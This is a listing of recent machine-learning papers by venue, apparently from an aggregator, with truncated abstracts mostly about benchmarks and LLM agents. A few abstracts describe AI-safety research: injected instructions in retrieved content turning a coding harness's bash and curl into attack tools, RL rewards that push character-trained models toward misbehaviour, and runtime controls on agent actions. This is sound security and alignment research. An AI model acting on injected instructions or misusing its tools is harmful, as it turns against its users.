- **[Forensics-Bench: A Comprehensive Forgery Detection Benchmark Suite for Large Vision Language Models](https://arxiv.org/abs/2503.15024)**
  - *Jin Wang, Cheng-Hui Lv, Xian Li et al.*
  - **CVPR 2025** · `2025-03-19`
  - Recently, the rapid development of AIGC has significantly boosted the diversities of fake media spread in the Internet, posing unprecedented threats to social security, politics, law, and etc. To detect the ever-increasingly diverse malicious fake media in the new era of AIGC, re…


### KDD

- **[Agent-Diff: Benchmarking LLM Agents on Enterprise API Tasks via Code Execution with State-Diff-Based Evaluation](https://arxiv.org/abs/2602.11224)**
  - *Hubert M. Pysklo, A. Zhuravel, Patrick Watson*
  - **KDD 2026** · `2026-02-11`
  - We present Agent-Diff, a novel benchmarking framework for evaluating agentic Large Language Models (LLMs) on real-world productivity software API tasks via code execution. Agentic LLM performance varies due to differences in models, external tool access, prompt structures, and ag…

- **[MultiTab: A Comprehensive Benchmark Suite for Multi-Dimensional Evaluation in Tabular Domains](https://arxiv.org/abs/2505.14312)**
  - *Kyungeun Lee, M. Eo, Hye-Seung Cho et al.*
  - **KDD 2025** · `2025-05-20`
  - Despite the widespread use of tabular data in real-world applications, most benchmarks rely on average-case metrics, which fail to reveal how model behavior varies across diverse data regimes. To address this, we propose MultiTab, a benchmark suite and evaluation framework for mu…


### ACL

- **[Testing Conversation Preservation Across LLM APIs: A Rule-Based Oracle for Detecting Silent Information Loss](https://arxiv.org/abs/2611.15543v1)**
  - *Xin Liu, Xu Han, Yuxin Wang et al.*
  - **ACL** · `2026-11-11`
  - LLM applications increasingly rely on translators and compatibility layers to move conversations across APIs. Yet a translated request can be accepted by the target API while silently losing information about instruction roles, tool interactions, error states, or generation contr…

- **[From Attack Surface to Defense Architecture: Compositional Security for Agentic Coding Harnesses](https://arxiv.org/abs/2611.13960v1)**
  - *Simon Hegelich, Bardh Prenkaj, Habiba Sarhan et al.*
  - **ACL** · `2026-11-10`
  - AI coding harnesses couple language models to shells, filesystems, and network sockets, turning the harness into an automated Living-off-the-Land (LotL) platform: once an adversary injects instructions into retrieved content, dual-use binaries such as bash, curl, and find become…

- **[AfriSpeech-MultiBench: A Verticalized Multidomain Multicountry Benchmark Suite for African Accented English ASR](https://arxiv.org/abs/2511.14255)**
  - *Gabrial Zencha Ashungafac, M. Sanni, Busayo Awobade et al.*
  - **ACL 2025** · `2025-11-18`
  - Recent advances in speech-enabled AI, including Google's NotebookLM and OpenAI's speech-to-speech API, are driving widespread interest in voice interfaces globally. Despite this momentum, there exists no publicly available application-specific model evaluation that caters to Afri…

- **[SecureWebArena: A Holistic Security Evaluation Benchmark for LVLM-based Web Agents](https://arxiv.org/abs/2510.10073)**
  - *Zong-Hao Ying, Yang-Guang Shao, Jian-Le Gan et al.*
  - **ACL 2025** · `2025-10-11`
  - Large vision-language model (LVLM)-based web agents are emerging as powerful tools for automating complex online tasks. However, when deployed in real-world environments, they face serious security risks, motivating the design of security evaluation benchmarks. Existing benchmark…

- **[Beyond N-Grams: Rethinking Evaluation Metrics and Strategies for Multilingual Abstractive Summarization](https://arxiv.org/abs/2507.08342)**
  - *Itai Mondshine, Tzuf Paz-Argaman, Reut Tsarfaty*
  - **ACL 2025** · `2025-07-10`
  - Automatic n-gram based metrics such as ROUGE are widely used for evaluating generative tasks such as summarization. While these metrics are considered indicative (even if imperfect) of human evaluation for English, their suitability for other languages remains unclear. To address…

- **[CiteEval: Principle-Driven Citation Evaluation for Source Attribution](https://arxiv.org/abs/2506.01829)**
  - *Yumo Xu, Peng Qi, Ji-Fan Chen et al.*
  - **ACL 2025** · `2025-06-02`
  - Citation quality is crucial in information-seeking systems, directly influencing trust and the effectiveness of information access. Current evaluation frameworks, both human and automatic, mainly rely on Natural Language Inference (NLI) to assess binary or ternary supportiveness…

- **[DocAgent: A Multi-Agent System for Automated Code Documentation Generation](https://arxiv.org/abs/2504.08725)**
  - *Dayu Yang, Antoine Simoulin, Xin Qian et al.*
  - **ACL 2025** · `2025-04-11`
  - High-quality code documentation is crucial for software development especially in the era of AI. However, generating it automatically using Large Language Models (LLMs) remains challenging, as existing approaches often produce incomplete, unhelpful, or factually incorrect outputs…

- **[NorEval: A Norwegian Language Understanding and Generation Evaluation Benchmark](https://arxiv.org/abs/2504.07749)**
  - *Vladislav Mikhailov, T. Enstad, David Samuel et al.*
  - **ACL 2025** · `2025-04-10`
  - This paper introduces NorEval, a new and comprehensive evaluation suite for large-scale standardized benchmarking of Norwegian generative language models (LMs). NorEval consists of 24 high-quality human-created datasets -- of which five are created from scratch. In contrast to ex…

- **[SEA-HELM: Southeast Asian Holistic Evaluation of Language Models](https://arxiv.org/abs/2502.14301)**
  - *Yosephine Susanto, Adithya Venkatadri Hulagadri, J. Montalan et al.*
  - **ACL 2025** · `2025-02-20`
  - With the rapid emergence of novel capabilities in Large Language Models (LLMs), the need for rigorous multilingual and multicultural benchmarks that are integrated has become more pronounced. Though existing LLM benchmarks are capable of evaluating specific capabilities of LLMs i…


### EMNLP

- **[From KMMLU-Redux to Pro: A Professional Korean Benchmark Suite for LLM Evaluation](https://arxiv.org/abs/2507.08924)**
  - *Seokhee Hong, SunKyoung Kim, Gui-Jin Son et al.*
  - **EMNLP 2025** · `2025-07-11`
  - The development of Large Language Models (LLMs) requires robust benchmarks that encompass not only academic domains but also industrial fields to effectively evaluate their applicability in real-world scenarios. In this paper, we introduce two Korean expert-level benchmarks. KMML…

- **[BenchMAX: A Comprehensive Multilingual Evaluation Suite for Large Language Models](https://arxiv.org/abs/2502.07346)**
  - *Xu Huang, Wenhao Zhu, Han-Xu Hu et al.*
  - **EMNLP 2025** · `2025-02-11`
  - Previous multilingual benchmarks focus primarily on simple understanding tasks, but for large language models(LLMs), we emphasize proficiency in instruction following, reasoning, long context understanding, code generation, and so on. However, measuring these advanced capabilitie…

- **[AraEval: An Arabic Multi-Task Evaluation Suite for Large Language Models](https://aclanthology.org/2025.emnlp-main.1679.pdf)**
  - *A. Althnian, Norah A. Alzahrani, Shaykhah Z. Alsubaie et al.*
  - **EMNLP 2025**
  - ,


### NAACL

- **[Automatic Evaluation of Healthcare LLMs Beyond Question-Answering](https://arxiv.org/abs/2502.06666)**
  - *Anna Arias-Duart, P. A. Martin-Torres, Daniel Hinjos et al.*
  - **NAACL 2025** · `2025-02-10`
  - Current Large Language Models (LLMs) benchmarks are often based on open-ended or close-ended QA evaluations, avoiding the requirement of human labor. Close-ended measurements evaluate the factuality of responses but lack expressiveness. Open-ended capture the model's capacity to…


### Other / arXiv

- **[PhysLoop: Harnessing LLMs' Physics Awareness for Self-Improving Video Generation Models](https://arxiv.org/abs/2611.16748)**
  - *Yuxuan Chen, Xiaojie Li, Hao Chen et al.*
  - 🤗 Featured · `2026-11-12`
  - Video generation models produce visually realistic videos but still struggle with physical dynamics and causal consistency. Learning from generated videos requires fine-grained physical supervision, yet reliable quality judgments, correction pairs, and controlled variations are d…

- **[Experience-Handoff Reinforcement Learning for Recursive Self-Improvement](https://arxiv.org/abs/2611.16409)**
  - *Doyoung Kim, Byeongguk Jeon, Kailin Zhang et al.*
  - 🤗 Featured · `2026-11-12`
  - It is common to train Large Language Models (LLMs) for agentic tasks with Reinforcement Learning (RL) from scalar rewards. However, this throws away the fine-grained information about the environment that the agent experienced during the trial (e.g., error logs). To utilize this…

- **[JustRUA: A Controlled Study of GPT-6 Robot-Use Agents](https://arxiv.org/abs/2611.16009)**
  - *Zefan Wang, Yufan Dang, Xuanwei Shi et al.*
  - 🤗 Featured · `2026-11-11`
  - GPT-6 Astra can drive a robot arm directly through a fixed harness, and scores of such robot-use agents on RoboDojo have risen quickly since. Reported systems differ in harness and test subset and often change several designs at once, so it is hard to tell which choices produce t…

- **[Science Prediction Universe](https://arxiv.org/abs/2611.15049)**
  - *Zengji Tu, Xiang Liu, Jiarui Sun et al.*
  - 🤗 · `2026-11-11`
  - Humanity has long sought to explain natural phenomena. Reliable prediction of experimental outcomes is a central test of our understanding of the processes that produce them. If artificial general intelligence (AGI) is to surpass human scientific capabilities, it must also predic…

- **[AnalogLayoutWorld: An Open Benchmark for Agentic Analog Layout Design](https://arxiv.org/abs/2611.16991v1)**
  - *NovaSilicon Team*
  - `2026-11-12`
  - Coding agents have demonstrated strong capabilities in software development, yet their ability to tackle long-horizon engineering tasks governed by physical constraints remains less understood. We study this question through analog circuit layout, which demands domain knowledge,…

- **[Singularity-Bench: Can Agents Build Agents?](https://arxiv.org/abs/2611.16591v1)**
  - *Yang Zhou, Krish Agarwal, Zhuoming Chen et al.*
  - `2026-11-12`
  - Frontier AI agents increasingly succeed on realistic, long-horizon tasks and are beginning to improve the systems through which they operate. Yet existing benchmarks often restrict agents to narrow action spaces, use simplified environments, or rely on verification methods that a…

- **[ReA-Bench: Benchmarking Responsible Agent Auditing](https://arxiv.org/abs/2611.16493v1)**
  - *Zipeng Ye, Shenyu Dai, Yong Xie et al.*
  - `2026-11-12`
  - As agents perform tasks autonomously in local and cloud environments, auditing their execution trajectories can help service providers identify risks and improve agent harnesses and foundation models. Our analysis of production and red-team trajectories shows that some risks are…

- **[daVinci-Prover: Agent-Native Mid-Training for Formal Theorem Proving](https://arxiv.org/abs/2611.16433v1)**
  - *Wenhong Zhu, Xuefeng Li, Jiashuo Zhang et al.*
  - `2026-11-12`
  - Advances in large language models (LLMs) are rapidly transforming formal theorem proving. Yet further progress remains constrained by the lack of a transparent and effective data recipe for systematically improving theorem-proving models. In this work, we argue that effective age…

- **[Look Here, Then Decide: Small Decision Models in a Harness Find Memory-Safety Vulnerabilities at Scale on Commodity GPUs](https://arxiv.org/abs/2611.16565v1)**
  - *Tim De Wachter, Kyryl Volkov, Myrto Eleftheria Gkogkou et al.*
  - `2026-11-12`
  - We ask whether small, open-weight decision models can support vulnerability discovery in open-source software at scale and what the surrounding system must provide. These models answer a typed question in one forward pass, returning scores for the permitted answers rather than te…

- **[AskALCF: A Self-Improving Agentic System for Intelligent HPC User Support](https://arxiv.org/abs/2611.15700v1)**
  - *Jingyan Jiang, Akhilesh Bondapalli, Krishna Rauniyar et al.*
  - `2026-11-11`
  - AI-based question-answering systems are increasingly used for user support, including at high-performance computing (HPC) facilities. However, existing systems lack a systematic, deployment-oriented approach for evaluating final-answer quality and attributing failures to specific…

- **[Bug Finding With Agentic Symbolic Execution](https://arxiv.org/abs/2611.15596v1)**
  - *George Granberry, Wolfgang Ahrendt, Andy Gordon et al.*
  - `2026-11-11`
  - Symbolic execution, in tools such as CrossHair for Python, is a powerful technique for finding bugs, but two barriers hinder its adoption: the human effort of annotating code with assertions, and the need to model the execution environment outside Python, such as an external data…

- **[DecArena: Evaluating Large-Scale Decentralized Multi-Agent Collaboration](https://arxiv.org/abs/2611.15521v1)**
  - *Jiali Cheng, Oleg Rokhlenko, Joo-Kyung Kim et al.*
  - `2026-11-11`
  - Emerging personal AI agents raise fundamental scalability and privacy concerns for centralized multi-agent systems (MASs), which rely on a global orchestrator with broad access to agents, resources, and communication. In decentralized environments, global visibility is unavailabl…

- **[Verify by Doing: Co-Evolving Agent Execution and Evaluation without External Feedback](https://arxiv.org/abs/2611.15276v1)**
  - *Yitong Lin, Jianda Chen, Yihao Hu et al.*
  - `2026-11-11`
  - Agent self-improvement requires feedback about task success, yet external feedback may be unavailable at test time. Agents must then infer success from observable evidence, and incomplete verification can misguide subsequent updates. We introduce Verify by Doing (VbD), a method t…

- **[Knowledge in the Harness, Reliability in the Weights: Teacher-Free Co-Evolution of an LLM Agent](https://arxiv.org/abs/2611.15268v1)**
  - *Yujia Zhang, Xinqi Ren, Shixiong Zhou et al.*
  - `2026-11-11`
  - Small open models suit private customer-service deployments but trail frontier models in two ways: they miss what the written policy requires in a given situation, and they act inconsistently on what they know. We study whether such a model can close both gaps from its own deploy…

- **[CastWorld: Benchmarking Context-Aware Agentic Time Series Forecasting Beyond Predictive Accuracy](https://arxiv.org/abs/2611.15262v1)**
  - *Bokai Pan, Ruijie Yang, Mingyue Cheng et al.*
  - `2026-11-11`
  - Agentic time series forecasting extends conventional approaches beyond one-shot numerical prediction toward autonomous, context-aware interaction. However, existing benchmarks offer limited integrated support for diverse contextual information, forecasting-specific adaptive inter…

- **[guardscope: Measuring Which Actions Runtime Controls Check in LLM Agent Systems](https://arxiv.org/abs/2611.15223v1)**
  - *Kentaroh Toyoda, Alex Leung, Bhuvaneswari U*
  - `2026-11-11`
  - Large-language model (LLM) agents execute actions on external systems through tool calls, and enterprises deploy runtime controls, such as agent gateways, to check this behavior in real time. However, a control can only evaluate the actions that cross the point where it is placed…

- **[EvoX: Rethinking the Agent Harness as a Runtime Policy](https://arxiv.org/abs/2611.15006v1)**
  - *Haoyang Zhang, Qumeng Sun, Xiao Zhang et al.*
  - `2026-11-11`
  - Large language model (LLM) agents increasingly interact with tools and environments, yet plausible model decisions do not always translate into successful execution due to tool-call mismatches, interrupted workflows, and unsupported completion claims. We present EvoX, a Rust-base…

- **[RSI-PDEbench: A Benchmark for Self-Improving Agents in PDE Solving](https://arxiv.org/abs/2611.14949v1)**
  - *Binghang Lu, Lang Cao, Changhong Mou et al.*
  - `2026-11-11`
  - Identifying and solving partial differential equations (PDEs) from sampled solution data often requires substantial expert effort in equation discovery, coefficient estimation, and numerical solver configuration, especially under noise and distribution shifts. Can large language…

- **["It's Just a Small Weapon": What Rewarding Misbehavior During RL Does to Character-Trained Models](https://arxiv.org/abs/2611.16069v1)**
  - *Mohammad Omar Khursheed, Thomas Morris, Fabien Roger*
  - `2026-11-11`
  - Developers train models to follow a consistent character using methods like Model Spec Midtraining (Li et al., 2026), which have been hypothesized to make alignment more robust and generalize broadly. However, it is possible for subsequent RL with misspecified rewards to work aga…

- **[MULTILOOP: Evolving Multi-Agent Harnesses for Complex Information-Seeking Tasks](https://arxiv.org/abs/2611.15754v1)**
  - *Daniela Gottesman, Gal Yona, Ori Ram et al.*
  - `2026-11-11`
  - The performance of LLM-based agents depends not only on the underlying model but also on the harness: the prompts, tools, and orchestration logic around it. Recent works automate harness optimization with coding agents that analyze execution traces, diagnose failures, and edit th…

- **[Provably Optimal HBT Legalization in Seconds: Certified Optima Reveal Where the Headroom Really Lies](https://arxiv.org/abs/2611.14928v1)**
  - *Kadhir Parani, Manjunath Bezawada, Divya M et al.*
  - `2026-11-11`
  - Hybrid bonding terminal (HBT) legalization assigns every terminal of a face-to-face 3D IC to its own pitch-grid site with minimum total Manhattan displacement. Open3DBench reports that a reinforcement-learning (RL) legalizer reduces displacement by 19-22% relative to a sliding-wi…

- **[Fewer Expert Transfers Without Changing Routing: Expert Eviction for MoE Offloading](https://arxiv.org/abs/2611.15842v1)**
  - *Pierre-Luc Bacon, Diego Calanzone, Jean-Maxime Larouche*
  - `2026-11-11`
  - A mixture-of-experts (MoE) language model uses only a few experts per token, so a server can keep most expert weights in CPU memory and copy an expert to the GPU when the router requests it. Recent methods train the router to keep the same experts for several tokens, and treat fe…

- **[ChJGBench: A Comprehensive Benchmark for Chinese Legal Judgment Generation with Diagnostic Evaluation](https://arxiv.org/abs/2611.15639v1)**
  - *Yinghao Hu, Linggang Kong, Qian Xiao et al.*
  - `2026-11-11`
  - With the rapid development of LLMs, increasing attention has been paid to whether they can reliably generate complete and legally valid judicial documents. This calls for a benchmark capable of evaluating whether models can accurately apply statutes and resolve outcome-critical i…

- **[MechBench: A Domain-Specific LLM Benchmark for Parallel Mechanisms](https://arxiv.org/abs/2611.15342v1)**
  - *Zhihao Xia, Tingting Wang, Hui Li et al.*
  - `2026-11-11`
  - Parallel mechanisms pose distinctive challenges to large language models (LLMs), as valid reasoning depends jointly on mechanism topology, loop closure, geometry, joint types, and modeling assumptions. Yet existing LLM benchmarks provide little systematic coverage of such domain-…

- **[Mach2: Scientific Discovery Platform with Deterministic Execution Constraints](https://arxiv.org/abs/2611.14777v1)**
  - *Vansh Sharma, Venkat Raman*
  - `2026-11-10`
  - Language-model agents can formulate workflows and invoke specialized tools, yet compliance with natural-language operating rules is not guaranteed by prompting alone. Mach2 addresses this limitation by coupling Eigen orchestration to deterministic, lint-like checks of tool reques…

- **[SynthCorp: A Platform for Creating Benchmarks for Data Agents](https://arxiv.org/abs/2611.14765v1)**
  - *Jiani Zhang, Manav Garg, Eugenie Lai et al.*
  - `2026-11-10`
  - Current benchmarks for LLM-driven data agents saturate quickly and cannot target specific capabilities. We present SynthCorp, a platform that creates customizable data estates and benchmarks by simulating how business events produce and modify corporate data over time. Each data…

- **[Comparative Analysis of Agent Evaluation Frameworks: Stability, Detection, and Discovery in Enterprise Analytics Agents](https://arxiv.org/abs/2611.14493v1)**
  - *Howard Zhang, Chuck Arvin, Logan Brown et al.*
  - `2026-11-10`
  - Deploying LLM-based analytics agents in enterprise settings requires evaluation frameworks that can reliably detect failures across complex, multi-tool workflows. We present a three-phase comparative study of three evaluation frameworks, each representing a distinct evaluation pa…

- **[Verifiable Agentic Traffic Class: A Policed Quality-of-Service Mechanism for Agentic AI Traffic, Evaluated from Simulation to Real-Kernel Adversarial Testing](https://arxiv.org/abs/2611.14211v1)**
  - *Naveen Babu Narayanan Nair, Sajay Kurup*
  - `2026-11-10`
  - Software agents built on large language models generate traffic unlike human web traffic, yet routers have no class for it and cannot verify a sender's claim to be an agent. This paper proposes the Verifiable Agentic Traffic Class (VATC), which combines a reserved Differentiated…

- **[Stinging the Swarm: Extracting Attacker Intelligence from a Twin-Controller OT Honeypot](https://arxiv.org/abs/2611.13406v1)**
  - *Canyon Grey Dell'Omo, Joao Pedro de Carvalho Voltani*
  - `2026-11-10`
  - Autonomous language-model agents can drive industrial controllers over fieldbus protocols, probing a plant at machine speed and in coordinated swarms. We present Talos, an inline gate that judges every agent request to a controller in milliseconds and routes agents it flags as ho…

- **[Continual-ARC: Measuring Skill Acquisition over a Working Lifetime](https://arxiv.org/abs/2611.14505v2)**
  - *Daniel Lenton, Yusha Arif, Haris Mahmood*
  - `2026-11-10`
  - Agent harnesses have emerged as a promising mechanism for continual learning, alongside test-time parametric learning. However, the current benchmarks have several limitations: they generally focus on a single applied domain, serve each instance only once, and assume a single fam…

- **[What a CAGE 4 Score Measures: An Audit of a Learned Cyber-Defense Benchmark, Its Reference Defenders, and the Tables Built on Them](https://arxiv.org/abs/2611.14068v1)**
  - *James Rice, Ji Hwan Park, Andres Kwasinski*
  - `2026-11-10`
  - CAGE Challenge 4 is the benchmark on which learned multi-agent cyber defenders are compared. We reproduce its two reference defenders, KEEP and H-MARL Expert, in a pinned container and show that three things read from it measure less than they are taken to measure. First, the sim…

- **[The RSI Tax: When Recursive Self-Improvement Is Not Worth the Cost](https://arxiv.org/abs/2611.13524v1)**
  - *Yitong Zhang, Ang Li, Yisen Wang*
  - `2026-11-10`
  - Recursive self-improvement (RSI) seeks to improve an agent using its own task experience. Its practical value depends on whether performance gains justify the full cost of self-improvement and task execution. We evaluate this trade-off on continual task streams, scoring each task…

- **[AutoAssumption: Searching over Assumptions Discovers ML-Systems Algorithms](https://arxiv.org/abs/2611.14844v1)**
  - *Igor Sadalski, Minghao Guo, Benjamin Jones et al.*
  - `2026-11-10`
  - Many advances in ML systems came from breaking an assumption that earlier methods took for granted: speculative decoding dropped the assumption that a model needs one forward pass per token. Yet algorithms rarely state their assumptions, so experts and discovery harnesses search…

- **[Alania-2: Turkish text-to-speech with instant and fine-tuned voice cloning](https://arxiv.org/abs/2611.13845v1)**
  - *Sezgin Saygili, Emre Kaplaner, Oncel Ozgul et al.*
  - `2026-11-10`
  - We present Alania-2, a Turkish text-to-speech (TTS) system with two built-in voices, voice design from text descriptions, and two kinds of voice cloning. Alania-2 is a 488M-parameter model with the VoxCPM architecture, which generates continuous audio latents with a diffusion hea…

- **[Antalia-2 Mini: A 7.6-million-parameter Turkish text-to-speech model trained entirely on synthetic speech](https://arxiv.org/abs/2611.13811v1)**
  - *Sezgin Saygili, Emre Kaplaner, Oncel Ozgul et al.*
  - `2026-11-10`
  - Antalia-2 Mini is a single-voice Turkish text-to-speech model with 7,620,931 parameters. It reads characters and produces 48 kHz audio at 41 times real time on an Apple M5 laptop CPU (2 threads). Its training audio came only from VoxCPM2 (the teacher), about 300 times larger, clo…

- **[Leaderboard Hacking: Preference-Based Model Evaluations are Vulnerable to Manipulation](https://arxiv.org/abs/2611.14769v1)**
  - *Eve Fleisig, Joachim Baumann, Dylan Hadfield-Menell et al.*
  - `2026-11-10`
  - Arena-style rankings of language models are a widely used evaluation framework in online leaderboards, research papers, and model evaluation in production. These rankings aim to realistically assess model performance using pairwise comparisons of anonymous models on user prompts,…

- **[Beyond Proxy Metrics: MLLMs as Human Surrogates for Explainable AI Evaluation](https://arxiv.org/abs/2611.13926v1)**
  - *Eoin M. Kenny, Salim I. Amoukou, Tom Bewley*
  - `2026-11-10`
  - Explainable AI (XAI) has expanded into a broad and impactful research area, but the fundamental question of how best to evaluate explanation techniques has proven frustratingly elusive. Methodologies typically revolve around either proxy metrics which tell us little about the uti…

- **[IFRS Compliance Verification: An Open Multi-LLM Benchmark and Content-Conditioned Ensemble Classifier](https://arxiv.org/abs/2611.13595v1)**
  - *Aghoghomena Akasukpe, Li Yang, Xinyao Zhou et al.*
  - `2026-11-10`
  - Verifying corporate financial disclosures against the International Financial Reporting Standards (IFRS) is a core auditing task in which experts cross-reference disclosures with hundreds of fine-grained regulatory paragraphs: a laborious, costly, and error-prone process that mot…


## Finance  (156)

### AAAI

- **[CoDe: Communication Delay-Tolerant Multi-Agent Collaboration via Dual Alignment of Intent and Timeliness](https://arxiv.org/abs/2501.05207)**
  - *Shou-Cheng Song, You-Fang Lin, Sheng Han et al.*
  - **AAAI 2025** · `2025-01-09`
  - Communication has been widely employed to enhance multi-agent collaboration. Previous research has typically assumed delay-free communication, a strong assumption that is challenging to meet in practice. However, real-world agents suffer from channel delays, receiving messages se…


### NeurIPS

- **[R&D-Agent-Quant: A Multi-Agent Framework for Data-Centric Factors and Model Joint Optimization](https://arxiv.org/abs/2505.15155)**
  - *Yuan-Te Li, Xu Yang, Xiao Yang et al.*
  - **NeurIPS 2025** · `2025-05-21`
  - Financial markets pose fundamental challenges for asset return prediction due to their high dimensionality, non-stationarity, and persistent volatility. Despite advances in large language models and multi-agent systems, current quantitative research pipelines suffer from limited…


### ICML

- **[ARTE: Agentic Refinement through Trade Execution for High-Frequency Trading Strategy Discovery](https://openreview.net/forum?id=VisvXioWmG)**
  - **ICML 2026** · OpenReview · `2026-10-12`
  - Existing LLM-based trading strategy development primarily uses aggregated price and volume data, which omit within-interval event order and displayed order book changes. Tick-level trade and quote observations preserve this information, but their scale makes the full history impr…

- **[DS-Lighting: Making Agent Harnesses Explicit for Data-Science Automation](https://openreview.net/forum?id=m7wsVqhIYs)**
  - **ICML 2025** · OpenReview · `2026-10-11`
  - Large Language Model (LLM) agents have shown promise for automating data-science workflows, yet their end-to-end performance depends critically on the agent harness that represents tasks, manages execution state, constrains output artifacts, and provides evaluation feedback. Exis…

- **[TradingArena: A Market-Making Benchmark for Ranking, Diagnosing, and Steering LLM Behavior](https://openreview.net/forum?id=6VObvVwaGZ)**
  - **ICML 2025** · OpenReview · `2026-09-19`
  - As large language models are increasingly deployed as agents, evaluation should capture both task performance and interactive behavior. Few benchmarks jointly measure performance and behavior under controlled changes to an agent’s information, action space, and inference. We intr…

- **[Visual Reasoning at the Harness Level: A Ladder for Controlled Evaluation](https://openreview.net/forum?id=8Rdl9qkU1A)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Advances in foundation models are shifting coding and working agents from predefined tools toward general computational environments. Yet existing visual agents often couple model, harness, and training choices, making it difficult to determine how this transition affects visual…

- **[ParaFusionBench: A Unified Benchmark for Cross-Paradigm Fusion in Factor Mining and Trading Decision-Making](https://openreview.net/forum?id=nqb5xH3QuC)**
  - **ICML 2025** · OpenReview · `2026-09-18`
  - Quantitative investment research has evolved from conventional models to large language models (LLMs) and multi-agent collaboration, forming two primary research trajectories: factor mining and trading decision-making. Their intersection yields four paradigms: Conventional Factor…

- **[Many Preferences, Few Policies: Compact Portfolios for Multi-Objective LLM Alignment](https://openreview.net/forum?id=byWrQmX9t4)**
  - **ICML 2025** · OpenReview · `2026-09-17`
  - Aligning large language models (LLMs) requires balancing competing objectives such as helpfulness, harmlessness, and conciseness. The appropriate balance varies across users and applications, yet training, evaluating, and deploying many policies across different reward weights is…

- **[FinancialAuditBench: Benchmark Construction under Differential Privacy Using Real-World Priors](https://openreview.net/forum?id=RKKGxm7O4L)**
  - **ICML 2025** · OpenReview · `2026-09-16`
  - As AI agents are becoming widely adopted in the financial services industry, careful measurement is essential to understand where they can be reliably deployed and where oversight and professional review remain necessary. Such measurement, however, is constrained by limited acces…

- **[PortfolioRouter: Consequence-Aware Multi-Task Routing for Portfolio Agents](https://openreview.net/forum?id=My6dyV7ecS)**
  - **ICML 2025** · OpenReview · `2026-09-14`
  - Portfolio agents can recommend materially different allocations for the same trading date, but standard best-expert classification does not weight errors by their financial cost. The cost of a routing error depends on the return forgone by choosing one proposal over another. We i…

- **[Multi-Identity Transaction Graph Pretraining for Fraud Detection](https://openreview.net/forum?id=1edqcNjZ3J)**
  - **ICML 2025** · OpenReview · `2026-09-07`
  - Real-world payment risk modeling is constrained by scarce fraud labels and fragmented behavioral context across multiple payment identities. A physical transaction may appear simultaneously in multiple behavioral histories defined by different identities, while each identity indu…

- **[Stacking RNNs and LSTMs for Fraud Detection in Cryptocurrency Blockchain Transactions](https://openreview.net/forum?id=Ukalf1pGgk)**
  - *{'username': '~Olufunso_Dayo_Alowolodu1', 'fullname': 'Olufunso Dayo Alowolodu', 'institutions': [{'name': 'The Federal University of Technology, Akure (FUTA)', 'domain': 'futa.edu.ng', 'country': 'NG'}]}*
  - **ICML 2025** · OpenReview · `2026-08-20`
  - Introduction
Cryptocurrency blockchains enable secure, decentralized financial transactions, but their pseudonymous, decentralized structure also makes them attractive for fraud such as money laundering, Ponzi schemes, and phishing, which makes it difficult for conventional intru…

- **[A Fraud-Detection-Inspired Framework for LLM Agents Security](https://openreview.net/forum?id=uUipgSY8Sh)**
  - *Sheldon Yu, Yingcheng Sun, Hanqing Guo et al.*
  - **ICML 2025** · OpenReview · `2026-06-12`
  - Large Language Model (LLM) agents demonstrate strong capabilities in autonomous task execution, tool use, and multi-step reasoning. However, their increasing autonomy also introduces a new attack surface: adversarial interactions can manipulate agent behavior through direct promp…

- **[FairCoder: Probing LLM Bias in High-Stakes Decision Making via Coding Tasks](https://openreview.net/forum?id=n7Mk11IVX8)**
  - *Yongkang Du, Jen-tse Huang, Jieyu Zhao et al.*
  - **ICML 2025** · OpenReview · `2026-06-03`
  - Large language models (LLMs) are increasingly used in high-stakes decisions such as hiring and college admissions, making their social bias a critical concern. While LLMs are trained to refuse explicitly biased requests, bias can be leaked implicitly during LLM planning and reaso…

- **[A multi-agent system for financial retrieval](https://openreview.net/forum?id=X86jxEIVtX)**
  - **ICML 2025** · OpenReview · `2026-02-11`

- **[CAFE-RL: Counterfactual Augmented Reinforcement Learning for Mechanism-Aware Onboarding Fraud Detection in E-Commerce](https://openreview.net/forum?id=31rXKDS7o8)**
  - *Linfeng Cao, Hang Yin, Yang Zhao et al.*
  - **ICML 2025** · OpenReview · `2026-02-03`
  - Buyer Onboarding Fraud Detection (BOFD), defined as fraud detection at the early stages of user registration and first-transaction screening, is a strategic decision-making problem that defines a platform intervention mechanism and shapes user participation, adversarial behavior,…

- **[Retriever Portfolios: A Principled Approach to Adaptive RAG](https://openreview.net/forum?id=NyGHaciFrK)**
  - *Miltiadis Stouras, Vincent Cohen-Addad, Silvio Lattanzi et al.*
  - **ICML 2025** · OpenReview · `2026-01-23`
  - Retrieval-augmented generation (RAG) systems typically rely on a single
retriever and a single set of hyperparameters, despite facing highly
heterogeneous queries that range from simple factoid questions to complex
multi-hop reasoning. We propose a method that automatically selec…

- **[Conversational Agents: A Framework for Evaluation (CAFE) (Dagstuhl Perspectives Workshop 24352)](https://openreview.net/forum?id=rpLDo1d8oU)**
  - *{'fullname': 'Christine Bauer', 'username': '~Christine_Bauer1'}, {'fullname': 'Li Chen'}, {'fullname': 'Nicola Ferro'} et al.*
  - **ICML 2025** · OpenReview · `2025-12-19`
  - During the workshop, we deeply discussed what CONversational Information ACcess (CONIAC) is and its unique features, proposing a world model abstracting it, and defined the Conversational Agents Framework for Evaluation (CAFE) for the evaluation of CONIAC systems, consisting of s…

- **[RAPTOR: Reasoned Agentic Portfolio Trading with Orchestrated Rebalancing](https://openreview.net/forum?id=ziuTkKhgT0)**
  - *Blake Almon, Matthew Caliboso, Alex Kim et al.*
  - **ICML 2025** · OpenReview · `2025-10-28`
  - We propose an institutional-style, multi-agent architecture for equity portfolio construction that couples a schema-constrained blackboard with structured debate and a Black-Litterman optimizer, enabling diversified, risk-aware allocations. The system is scalable, modular, and in…

- **[FinTSBridge: A New Evaluation Suite for Real-world Financial Prediction with Advanced Time Series Models](https://openreview.net/forum?id=b3xZoZcW1J)**
  - *Yanlong Wang, Jian Xu, Tiantian Gao et al.*
  - **ICML 2025** · OpenReview · `2025-09-25`
  - Despite the growing attention to time series forecasting in recent years, many studies have proposed various solutions to address the challenges encountered in time series prediction, aiming to improve forecasting performance. However, the strategic interactions inherent in finan…

- **[CTBench: Cryptocurrency Time Series Generation Benchmark](https://openreview.net/forum?id=RzT2sombPD)**
  - *Yihao Ang, Qiang Wang, Qiang Huang et al.*
  - **ICML 2025** · OpenReview · `2025-09-17`
  - Synthetic time series are vital for data augmentation, stress testing, and prototyping in quantitative finance. Yet in cryptocurrency markets, characterized by 24/7 trading, extreme volatility, and rapid regime shifts, existing Time Series Generation (TSG) methods and benchmarks…

- **[QuantAgent: Price-Driven Multi-Agent LLMs for High-Frequency Trading](https://openreview.net/forum?id=fdKmhFYcQv)**
